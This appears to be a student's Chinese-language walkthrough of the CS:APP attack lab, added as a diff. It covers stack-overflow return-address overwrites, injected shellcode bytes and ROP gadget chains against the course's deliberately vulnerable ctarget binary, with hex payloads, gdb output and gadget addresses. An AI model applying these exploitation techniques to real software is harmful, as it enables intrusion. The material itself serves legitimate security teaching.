@@ -1,0 +1,167 @@
+attack lab
+re萌新直接开启pwn新世界大门
+
+
+
+level1
+栈溢出攻击
+gdb ctarget
+反编译getbuf的代码
+disas getbuf
+0x00000000004017a8 <+0>:	sub    $0x28,%rsp
+第一句，直接看出分配了0x28个空间输入字符串，只要输入的长度比0x28，也就是比40大的话，就可以覆盖掉getbuf的返回地址，题目要求返回的不是test，而是touch1,
+disas touch1,看touch1的首地址0x4017c0，把这个地址放在超过0x28的这个长度的后面的返回地址，就可直接跳转到touch1，建立一个txt，用
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+填充，用hexraw -i 文件名 | ./ctarget -q
+将数据转换成字符串，攻击成功
+
+
+
+level2
+思路和level1差不多，但是这次用代码注入
+先查看touch2的汇编代码
+gdb ctarget
+disas touch2,
+这里显示的大概是意思
+vlevel=2
+if(2==cookie){
+printf(“Touch2!: You called touch2(0x%.8x)\n”);
+	validate(2);
+}else{
+	printf(“Touch2!: You called touch2(0x%.8x)\n”);
+	fail(2);
+}
+exit(0);
+对照下来，如何进行代码填充，rdi里面应该是存了参数的值，让cookie的值和rdi中相等，再让地址指向touch2的首地址，这里不能直接call <touch2>,那就拆开写
+test.s
+movq $0x59b997fa,%rdi
+pushq 0x4017ec
+ret
+gcc -c test.s
+objdump -d test.o
+得到二进制
+48 c7 c7 fa 97 b9 59 ff 34 25 ec 17 40 00 c3
+ret是弹栈返回，所以要找到rsp的地址才能将数据注入成功
+gdb调试找rsp值
+gdb ctarget
+(gdb)  b getbuf
+Breakpoint 1 at 0x4017a8: file buf.c, line 12.
+(gdb) r -q
+Starting program: /home/fang/Desktop/lab/target1/ctarget -q
+Cookie: 0x59b997fa
+
+Breakpoint 1, getbuf () at buf.c:12
+12	buf.c: No such file or directory.
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
+   0x00000000004017ac <+4>:	mov    %rsp,%rdi
+   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:	mov    $0x1,%eax
+   0x00000000004017b9 <+17>:	add    $0x28,%rsp
+   0x00000000004017bd <+21>:	retq   
+End of assembler dump.
+(gdb) stepi
+14	in buf.c
+(gdb) p /x $rsp
+$1 = 0x5561dc78
+在多出来的数据中填充地址即可转到栈指针的地址，其余的以0填充
+48 c7 c7 fa 97 b9 59 ff 34 25 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
+
+
+
+level3
+这题还是代码注入，需要传入字符串作为参数
+这里cookie作为参数，指向的是cookie的地址，这时候需要将cookie中的值与acsii表进行比较 man ascii进行一一比较，得到0x5561dca8
+用和level2相似的方法进行代码注入
+movq $5561dca8,%edi
+pushq 0x4018fa
+ret
+
+gcc -c attack3.s
+objdump -d attack3.o
+
+得到指令序列
+48 c7 c7 a8 dc 61 55 68 fa 18 
+40 00 c3
+
+cookie的16进制码：35 39
+62 39 39 37 66 61 00
+
+还需要考虑注入的代码注入到缓冲区的什么地方，数据才不会发生改变
+touch3中将hexmatch和strncmp压入栈中会会导致缓冲区数据改变，只能通过查看hexmatch前后缓冲区不变的量，确定注入的位置，找到缓冲区的起始地址覆盖掉原来的返回地址就行了
+最后的攻击代码是
+48 c7 c7 a8 dc 61 55 68 fa 18 
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 35 39
+62 39 39 37 66 61 00
+
+./hex2raw -i attack3.txt | ./ctarget -q验证即可
+
+
+
+level4
+ROP攻击
+从farm里面找gadget凑出攻击指令，%rdi的值为cookie
+用gadget的起始地址覆盖原有的返回地址
+gadget是
+popq %rax
+ret
+mov %rax,%rdi
+ret
+
+找到两段指令的地址还有cookie，还有touch2的地址填充即可
+
+
+
+
+level5
+栈顶位置随机，用lea指令表示rsp，将指针存在rax中
+lea (rsp,rsi,1),eax
+需要传递的字符串的起始地址传到rdi中
+调用touch3（指向touch3的首地址）
+要找出指令字节
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+ 找出rsp的地址 48 89 e0  地址401a06
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+找出rsi的地址48 89 c7   地址4019a2
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+偏移内容弹到rax中     4019cc
+cookie的偏移地址0x48
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+eax中的值传到edx中 4019dd
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	retq   
+edx中的值存到ecx中  401a70
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+ecx中的值存到esi中 401a13
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+栈顶+偏移地址存到rax中 0x4019d6
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+字符串首地址存到rdi中 0x4019a2
+touch3的首地址
+字符串
+
+前面56位用00 填充，后面依次填充每一步的地址，注意cookie的偏移量0x48，最后填充touch3的首地址和字符串
+
